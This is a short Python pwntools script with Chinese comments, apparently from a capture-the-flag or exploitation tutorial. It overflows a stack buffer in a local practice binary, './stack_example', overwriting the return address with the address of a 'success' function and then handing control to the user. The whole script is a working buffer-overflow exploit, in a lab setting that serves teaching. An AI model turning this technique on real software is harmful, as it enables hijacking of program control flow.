##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x08048456   # 通过 ida 查看 success 函数的起始地址
## 构造payload 
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr) # p32 将数字转换为字符串（自动变为小端序）此处为：'\x56\x84\x04\x08'
print(p32(success_addr))
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()